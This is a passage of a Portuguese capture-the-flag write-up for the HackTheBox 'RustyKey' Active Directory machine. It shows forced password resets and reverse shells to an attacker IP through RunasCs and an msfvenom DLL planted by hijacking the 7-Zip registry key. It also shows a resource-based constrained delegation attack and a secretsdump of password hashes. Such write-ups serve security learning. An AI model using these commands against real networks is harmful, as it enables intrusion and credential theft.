</span></span><span class=dark:text-neutral-300><strong>Nesse caso é sempre bom utilizar o <code>distinguishedname</code> do objeto no AD para não ter problema de encontrar o objeto. Caso não funcione, tente se adicionar no grupo novamente pois o cronjob da máquina pode ter removido.</strong></span></div><p>Agora ao mudarmos a senha do <strong>BB.MORGAN</strong>, recebemos a seguinte confirmação:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=s1>&#39;IT-Computer3$.ccache&#39;</span> bloodyAD --host <span class=s2>&#34;dc.rustykey.htb&#34;</span> -d <span class=s2>&#34;rustykey.htb&#34;</span> -k <span class=nb>set</span> password <span class=s1>&#39;bb.morgan&#39;</span> <span class=s1>&#39;Piroquinha123!&#39;</span>                                 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
</span></span></code></pre></div><p>E agora é só pedirmos o TGT do <strong>BB.MORGAN</strong> e logar no <code>Evil-Winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; getTGT.py -dc-ip <span class=s2>&#34;dc.rustykey.htb&#34;</span> rustykey.htb/<span class=s2>&#34;bb.morgan&#34;</span>:<span class=s1>&#39;Piroquinha123!&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies                                                                
</span></span><span class=line><span class=cl>                                                                                               
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in bb.morgan.ccache
</span></span><span class=line><span class=cl>----------------------------------------------
</span></span><span class=line><span class=cl>&gt; <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>bb.morgan.ccache
</span></span><span class=line><span class=cl>----------------------------------------------
</span></span><span class=line><span class=cl>&gt; evil-winrm -r RUSTYKEY.HTB -i dc.rustykey.htb
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\b</span>b.morgan<span class=se>\D</span>ocuments&gt; 
</span></span></code></pre></div><h2 class="relative group">Root Flag<div id=root-flag class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#root-flag aria-label=Âncora>#</a></span></h2><h3 class="relative group">Encontrando o DLL hijacking<div id=encontrando-o-dll-hijacking class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#encontrando-o-dll-hijacking aria-label=Âncora>#</a></span></h3><p>No desktop do <strong>BB.MORGAN</strong>, vemos um arquivo chamado <code>internal.pdf</code> e analisando ele, vemos a seguinte mensagem:</p><blockquote><p>Internal Memo<br>From: <a href=mailto:bb.morgan@rustykey.htb>bb.morgan@rustykey.htb</a><br>To: <a href=mailto:support-team@rustykey.htb>support-team@rustykey.htb</a><br>Subject: Support Group - Archiving Tool Access<br>Date: Mon, 10 Mar 2025 14:35:18 +0100<br><br>Hey team,<br>As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.<br>This is mainly to help streamline ticket resolution related to extraction/compression issues reported
by the Finance and IT teams. Some newer systems handle context menu actions differently, so
registry-level adjustments are expected during this phase.<br><br>A few notes:</p><ul><li>Please avoid making unrelated changes to system components while this access is active.</li><li>This permission change is logged and will be rolled back once the archiving utility is confirmed
stable in all environments.</li><li>Let DevOps know if you encounter access errors or missing shell actions.<br><br>Thanks,<br>BB Morgan<br>IT Department</li></ul></blockquote><p>Analisando esse documento, temos algumas pistas:</p><ul><li><p>“extended access has been temporarily granted to allow testing and troubleshooting of file archiving features.” -> o grupo <code>Support</code> recebeu permissões ampliadas temporariamente para testar funcionalidades de compressão/extração de arquivos.</p></li><li><p>&ldquo;Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.&rdquo; -> O PDF menciona ajustes no registro relacionados ao menu de contexto.</p></li><li><p>“Please avoid making unrelated changes to system components while this access is active.” -> Indica que alterações estão sendo feitas apenas em componentes de terceiros.</p></li></ul><p>Tendo isso em mente e vasculhando a máquina, vemos que ela tem o <code>7-zip</code> instalado, então buscando por valores de registros relacionados a zip, encontramos os seguintes valores:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reg query <span class=s2>&#34;HKLM\SOFTWARE\Classes\CLSID&#34;</span> /s /f <span class=s2>&#34;zip&#34;</span>                                                                                                         
</span></span><span class=line><span class=cl>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>23170F69-40C1-278A-1000-000100020000<span class=o>}</span>                                                                                                              
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_SZ    7-Zip Shell Extension                                                                                                                                              
</span></span><span class=line><span class=cl>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>23170F69-40C1-278A-1000-000100020000<span class=o>}</span><span class=se>\I</span>nprocServer32                                                                                               
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_SZ    C:<span class=se>\P</span>rogram Files<span class=se>\7</span>-Zip<span class=se>\7</span>-zip.dll                                                                                                                                   
</span></span><span class=line><span class=cl>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>888DCA60-FC0A-11CF-8F0F-00C04FD7D062<span class=o>}</span>                                                                                                              
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_SZ    Compressed <span class=o>(</span>zipped<span class=o>)</span> Folder SendTo Target                                                                                                                           
</span></span><span class=line><span class=cl>    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll,-10226                                                                                                            
</span></span><span class=line><span class=cl>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>888DCA60-FC0A-11CF-8F0F-00C04FD7D062<span class=o>}</span><span class=se>\D</span>efaultIcon                                                                                                  
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll                                                                                                                           
</span></span><span class=line><span class=cl>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>888DCA60-FC0A-11CF-8F0F-00C04FD7D062<span class=o>}</span><span class=se>\I</span>nProcServer32                                                                                               
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll                                                                                                                           
</span></span><span class=line><span class=cl>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af<span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_SZ    Compressed <span class=o>(</span>zipped<span class=o>)</span> Folder Context Menu
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af<span class=o>}</span><span class=se>\I</span>nProcServer32 
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>BD472F60-27FA-11cf-B8B4-444553540000<span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_SZ    Compressed <span class=o>(</span>zipped<span class=o>)</span> Folder Right Drag Handler
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>BD472F60-27FA-11cf-B8B4-444553540000<span class=o>}</span><span class=se>\I</span>nProcServer32 
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31<span class=o>}</span><span class=se>\D</span>efaultIcon
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31<span class=o>}</span><span class=se>\I</span>nProcServer32 
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>ed9d80b9-d157-457b-9192-0e7280313bf0<span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_SZ    Compressed <span class=o>(</span>zipped<span class=o>)</span> Folder DropHandler
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>ed9d80b9-d157-457b-9192-0e7280313bf0<span class=o>}</span><span class=se>\I</span>nProcServer32 
</span></span><span class=line><span class=cl>    <span class=o>(</span>Default<span class=o>)</span>    REG_EXPAND_SZ    %SystemRoot%<span class=se>\s</span>ystem32<span class=se>\z</span>ipfldr.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>End of search: <span class=m>14</span> match<span class=o>(</span>es<span class=o>)</span> found.
</span></span></code></pre></div><p>E olhando mais a fundo o valor da DLL, vemos que o grupo <code>Support</code> tem permissão de edição dessa chave:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Get-Acl <span class=s2>&#34;HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class=p>|</span> Format-list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Path   : Microsoft.PowerShell.Core<span class=se>\R</span>egistry::HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\C</span>lasses<span class=se>\C</span>LSID<span class=se>\{</span>23170F69-40C1-278A-1000-000100020000<span class=o>}</span><span class=se>\I</span>nprocServer32
</span></span><span class=line><span class=cl>Owner  : BUILTIN<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>Group  : RUSTYKEY<span class=se>\D</span>omain Users
</span></span><span class=line><span class=cl>Access : APPLICATION PACKAGE AUTHORITY<span class=se>\A</span>LL APPLICATION PACKAGES Allow  ReadKey
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
</span></span><span class=line><span class=cl>         CREATOR OWNER Allow  FullControl
</span></span><span class=line><span class=cl>         RUSTYKEY<span class=se>\S</span>upport Allow  FullControl &lt;----
</span></span><span class=line><span class=cl>         NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl 
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\U</span>sers Allow  ReadKey
</span></span><span class=line><span class=cl>Audit  :
</span></span><span class=line><span class=cl>Sddl   : O:BAG:DUD:AI<span class=o>(</span>A<span class=p>;</span>CIID<span class=p>;</span>KR<span class=p>;;;</span>AC<span class=o>)(</span>A<span class=p>;</span>ID<span class=p>;</span>KA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>CIIOID<span class=p>;</span>KA<span class=p>;;;</span>CO<span class=o>)(</span>A<span class=p>;</span>CIID<span class=p>;</span>KA<span class=p>;;;</span>S-1-5-21-3316070415-896458127-4139322052-1132<span class=o>)(</span>A<span class=p>;</span>CIID<span class=p>;</span>KA<span class=p>;;;</span>SY<span class=o>)(</span>A<span class=p>;</span>CIIOID<span class=p>;</span>KA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>CIID<span class=p>;</span>KR<span class=p>;;;</span>BU<span class=o>)</span>
</span></span></code></pre></div><h3 class="relative group">Obtendo o EE.REED<div id=obtendo-o-eereed class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#obtendo-o-eereed aria-label=Âncora>#</a></span></h3><p>Voltando para o <code>Bloodhound</code>, vemos que também temos a permissão de <code>ForceChangePassword</code> no usuário <strong>EE.REED</strong> e que ele faz parte do grupo <code>Support</code>:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=ee.reed src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761776850/63aa35fa-1fb4-45ce-adb6-d5accdfb693e.png></figure><p>Então do mesmo jeito que mudamos a senha do <strong>BB.MORGAN</strong>, iremos mudar também a do <strong>EE.REED</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=s1>&#39;IT-Computer3$.ccache&#39;</span> bloodyAD --host <span class=s2>&#34;dc.rustykey.htb&#34;</span> -d <span class=s2>&#34;rustykey.htb&#34;</span> -k <span class=nb>set</span> password <span class=s1>&#39;ee.reed&#39;</span> <span class=s1>&#39;Piroquinha123!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
</span></span></code></pre></div><p>Porém ao tentar solicitar um TGT do <strong>EE.REED</strong> recebemos o seguinte erro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getTGT.py -dc-ip <span class=s2>&#34;dc.rustykey.htb&#34;</span> rustykey.htb/<span class=s2>&#34;ee.reed&#34;</span>:<span class=s1>&#39;Piroquinha123!&#39;</span>  
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP<span class=o>(</span>KDC has no support <span class=k>for</span> encryption <span class=nb>type</span><span class=o>)</span>
</span></span></code></pre></div><p>Então teremos que pegar shell de outra maneira. Estarei utilizando o <a href=https://github.com/antonioCoco/RunasCs target=_blank>RunasCs</a> de dentro da máquina para isso:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\b</span>b.morgan<span class=se>\D</span>ocuments&gt; ./runas.exe ee.reed <span class=s1>&#39;Piroquinha123!&#39;</span> powershell -r 10.10.14.228:4444 --force-profile
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Warning: The logon <span class=k>for</span> user <span class=s1>&#39;ee.reed&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class=s1>&#39;8&#39;</span> to obtain a more privileged token.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running in session <span class=m>0</span> with process <span class=k>function</span> CreateProcessWithLogonW<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Using Station<span class=se>\D</span>esktop: Service-0x0-2b12c42$<span class=se>\D</span>efault
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Async process <span class=s1>&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> with pid <span class=m>5404</span> created in background.
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rlwrap nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.75.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.75:57195.
</span></span><span class=line><span class=cl>Windows PowerShell 
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>rustykey<span class=se>\e</span>e.reed
</span></span></code></pre></div><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Caso você não consiga alterar a senha dele ou iniciar uma reverse shell com o <code>RunasCs</code>, tente remover ele do grupo <code>Protected Objects</code> novamente.</strong></span></div><h3 class="relative group">Realizando o DLL hijacking para obter o MM.TURNER<div id=realizando-o-dll-hijacking-para-obter-o-mmturner class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#realizando-o-dll-hijacking-para-obter-o-mmturner aria-label=Âncora>#</a></span></h3><p>Agora que estamos com o usuário e a permissão de editar a DLL que encontramos anteriormente, iremos gerar um payload de reverse shell. Estarei usando o <code>Msfvenom</code> para isso:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/powershell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.228 <span class=nv>LPORT</span><span class=o>=</span><span class=m>5555</span> -f dll -o revshell.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: <span class=m>1867</span> bytes
</span></span><span class=line><span class=cl>Final size of dll file: <span class=m>9216</span> bytes
</span></span><span class=line><span class=cl>Saved as: revshell.dll
</span></span></code></pre></div><p>Salvei essa DLL na pasta <code>C:\Windows\Tasks\revshell.dll</code>, agora é só alterar o valor do registro e esperar a shell cair:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Set-ItemProperty -Path <span class=s2>&#34;HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> -Name <span class=s2>&#34;(Default)&#34;</span> -Value <span class=s2>&#34;C:\windows\tasks\revshell.dll&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rlwrap nc -lvnp <span class=m>5555</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::5555
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:5555
</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.75.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.75:57212.
</span></span><span class=line><span class=cl>Windows PowerShell running as user mm.turner on DC
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>rustykey<span class=se>\m</span>m.turner
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows&gt; 
</span></span></code></pre></div><h3 class="relative group">Realizando o RCBD para obter o BackupAdmin<div id=realizando-o-rcbd-para-obter-o-backupadmin class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#realizando-o-rcbd-para-obter-o-backupadmin aria-label=Âncora>#</a></span></h3><p>Voltando para o <code>Bloodhound</code> e analisando o <strong>MM.TURNER</strong>, vemos que ele faz parte do grupo <code>DELEGATION MANAGER</code> o que permite adicionarmos a permissão <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> em contas de serviços.</p><p>Analisando o nosso cenário atual, ja possuimos a conta de serviço <code>IT-Computer3$</code>, e existe um usuário chamado <code>BackupAdmin</code> no AD que possui a permissão de <code>DCSync</code>. Tendo isso em mente, podemos tentar um ataque de <code>RBCD</code> (Resource-based Constrained Delegation). Esse <a href=https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/resource-based-constrained-delegation#new-concepts target=_blank>hacktricks</a> explica detalhadamente esse ataque, mas resumindo aqui: Iremos adicionar uma permissão chamada <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> no &ldquo;computador&rdquo; <code>DC</code> que permitirá a conta <code>IT-Computer3$</code> &ldquo;fingir&rdquo; ou &ldquo;fazer&rdquo; coisas no nome do <code>DC</code>, ou seja, iremos impersonar o <code>DC</code> e gerar um TGS no nome do <code>BackupAdmin</code> e rodar <code>DCSync</code>.</p><p>Para realizar esse ataque, irei utilizar os seguintes comandos na shell do <strong>MM.TURNER</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS C:<span class=se>\W</span>indows&gt; Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount <span class=s1>&#39;it-computer3$&#39;</span>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows&gt; Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DistinguishedName                    : <span class=nv>CN</span><span class=o>=</span>DC,OU<span class=o>=</span>Domain Controllers,DC<span class=o>=</span>rustykey,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>DNSHostName                          : dc.rustykey.htb
</span></span><span class=line><span class=cl>Enabled                              : True
</span></span><span class=line><span class=cl>Name                                 : DC
</span></span><span class=line><span class=cl>ObjectClass                          : computer
</span></span><span class=line><span class=cl>ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
</span></span><span class=line><span class=cl>PrincipalsAllowedToDelegateToAccount : <span class=o>{</span><span class=nv>CN</span><span class=o>=</span>IT-Computer3,OU<span class=o>=</span>Computers,OU<span class=o>=</span>IT,DC<span class=o>=</span>rustykey,DC<span class=o>=</span>htb<span class=o>}</span> &lt;-- Permissão setada com sucesso
</span></span><span class=line><span class=cl>SamAccountName                       : DC$
</span></span><span class=line><span class=cl>SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
</span></span><span class=line><span class=cl>UserPrincipalName                    : 
</span></span></code></pre></div><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Aqui colocamos a permissão no <code>DC</code> pois irá nos permitir impersonar qualquer usuário do AD.</strong></span></div><p>Após isso é só solicitar um TGS impersonando o <code>BackupAdmin</code> e rodar o <code>DCSync</code>. Para solicitar o TGS estarei usando o <code>getST.py</code> do <code>Impacket</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getST.py -spn CIFS/dc.rustykey.htb -impersonate BackupAdmin -dc-ip <span class=s2>&#34;dc.rustykey.htb&#34;</span> <span class=s2>&#34;rustykey.htb&#34;</span>/<span class=s1>&#39;it-computer3$&#39;</span>:<span class=s1>&#39;Rusty88!&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> CCache file is not found. Skipping...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Getting TGT <span class=k>for</span> user
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Impersonating BackupAdmin
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting S4U2self
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting S4U2Proxy
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in BackupAdmin@CIFS_dc.rustykey.htb@RUSTYKEY.HTB.ccache
</span></span></code></pre></div><p>E para dumpar as hashs do dominio, estarei usando o <code>secretsDump.py</code> que também é do <code>Impacket</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span>BackupAdmin@CIFS_dc.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump -k <span class=s2>&#34;dc.rustykey.htb&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Service RemoteRegistry is in stopped state                                                                                                                                                
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service RemoteRegistry                                                                                                                                                           
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target system bootKey: 0x94660760272ba2c07b13992b57b432d4                                                                                                                                 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping <span class=nb>local</span> SAM hashes <span class=o>(</span>uid:rid:lmhash:nthash<span class=o>)</span>                                                                                                                                          
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::                                                                                                        
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                
</span></span><span class=line><span class=cl>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                       
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping cached domain logon information <span class=o>(</span>domain/username:hash<span class=o>)</span>                                                                                                                            
